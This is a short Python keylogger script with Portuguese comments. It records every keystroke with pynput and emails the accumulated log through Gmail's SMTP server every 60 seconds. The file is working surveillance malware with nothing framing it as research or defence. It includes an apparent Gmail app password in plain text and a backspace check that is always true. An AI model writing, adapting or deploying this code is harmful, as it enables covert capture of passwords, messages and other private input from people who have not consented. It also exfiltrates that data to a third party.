from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#CONFIGURAÇÕES DE E-MAIL
EMAIL_ORIGEM = "seu_email@gmail.com"
EMAIL_DESTINO = "seu_email@gmail.com"
SENHA_EMAIL = "qqca fpyg kisp gwhu"
 
def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo Keylogger"
        msg['FROM'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
    
        log = ""

    #AGENDAR O ENVIO A CADA 60 SEGUNDOS 
    Timer(60, enviar_email).start()

def on_press(Key):
    global log
    try: 
        if Key.char is not None:
            log += Key.char 
    except AttributeError:
        if Key == keyboard.Key.space: 
            log += " "
        elif Key == keyboard.Key.enter:
            log += "\n"
        elif keyboard.Key.backspace:
            log+="[<]"
        else:
            pass # IGNORAR CONTROL, SHIFT, ETC...

# INICIA O KEYLOGGER E O ENVIO AUTOMÁTICO 

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()